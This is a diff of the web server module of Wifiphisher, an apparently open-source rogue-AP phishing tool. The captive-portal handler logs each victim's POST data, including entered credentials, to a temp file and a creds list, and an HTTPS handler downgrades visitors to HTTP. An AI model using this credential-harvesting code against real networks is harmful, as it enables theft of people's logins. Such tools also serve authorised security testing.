@@ -1,21 +1,12 @@
-import datetime
-import json
 import logging
-import os.path
-import re
-import time
-import asyncio
-
+import json
+from tornado.escape import json_decode
 import tornado.ioloop
 import tornado.web
-import tornado.platform.asyncio
-import wifiphisher.common.constants as constants
-import wifiphisher.common.extensions as extensions
+import os.path
 import wifiphisher.common.uimethods as uimethods
-import wifiphisher.common.victim as victim
-from tornado.escape import json_decode
-
-asyncio.set_event_loop_policy(tornado.platform.asyncio.AnyThreadEventLoopPolicy())
+import wifiphisher.common.extensions as extensions
+import wifiphisher.common.constants as constants
 
 hn = logging.NullHandler()
 hn.setLevel(logging.DEBUG)
@@ -26,7 +17,6 @@ template = False
 terminate = False
 creds = []
 logger = logging.getLogger(__name__)
-credential_log_path = None
 
 
 class DowngradeToHTTP(tornado.web.RequestHandler):
@@ -108,13 +98,6 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         logger.info("GET request from %s for %s", self.request.remote_ip,
                     self.request.full_url())
 
-        # Find the victim object that corresponds to the ip address
-        # And try to Discover OS by requestt
-        victims_instance = victim.Victims.get_instance()
-        victims_instance.associate_victim_ip_to_os(
-            self.request.remote_ip,
-            self.request.full_url())
-
     def post(self):
         """
         Override the post method
@@ -135,31 +118,20 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         except KeyError:
             return
 
-        try:
-            # Check if this is a valid POST request
-            if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
-                post_data = tornado.escape.url_unescape(self.request.body)
-                # log the data
-                log_file_path = "/tmp/wifiphisher-webserver.tmp"
-                with open(log_file_path, "a+") as log_file:
-                    log_file.write("POST request from {0} with {1}\n".format(
-                        self.request.remote_ip, post_data))
-                    # record the post requests in the logging file
-                    logger.info("POST request from %s with %s",
-                                self.request.remote_ip, post_data)
-                if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
-                   re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
-                    if credential_log_path:
-                        with open(credential_log_path, 'a+') as credential_log:
-                            credential_log.write("{} {}".format(
-                                time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
-                                "POST request from {0} with {1}\n".format(
-                                    self.request.remote_ip, post_data)))
-                    creds.append(post_data)
-                    terminate = True
-        # Invalid UTF-8, drop it.
-        except UnicodeDecodeError:
-            pass
+        # check if this is a valid phishing post request
+        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
+            post_data = tornado.escape.url_unescape(self.request.body)
+            # log the data
+            log_file_path = "/tmp/wifiphisher-webserver.tmp"
+            with open(log_file_path, "a+") as log_file:
+                log_file.write("POST request from {0} with {1}\n".format(
+                    self.request.remote_ip, post_data))
+                # record the post requests in the logging file
+                logger.info("POST request from %s with %s",
+                            self.request.remote_ip, post_data)
+
+            creds.append(post_data)
+            terminate = True
 
         requested_file = self.request.path[1:]
         template_directory = template.get_path()
@@ -174,12 +146,6 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         file_path = template_directory + render_file
         self.render(file_path, **template.get_context())
 
-        # Find the victim object that corresponds to the ip address
-        # And try to Discover OS by request
-        victims_instance = victim.Victims.get_instance()
-        victims_instance.associate_victim_ip_to_os(
-            self.request.remote_ip,
-            self.request.full_url())
 
 def runHTTPServer(ip, port, ssl_port, t, em):
     global template
@@ -203,7 +169,6 @@ def runHTTPServer(ip, port, ssl_port, t, em):
     app.listen(port, address=ip)
 
     ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
-
     https_server = tornado.httpserver.HTTPServer(
         ssl_app,
         ssl_options={
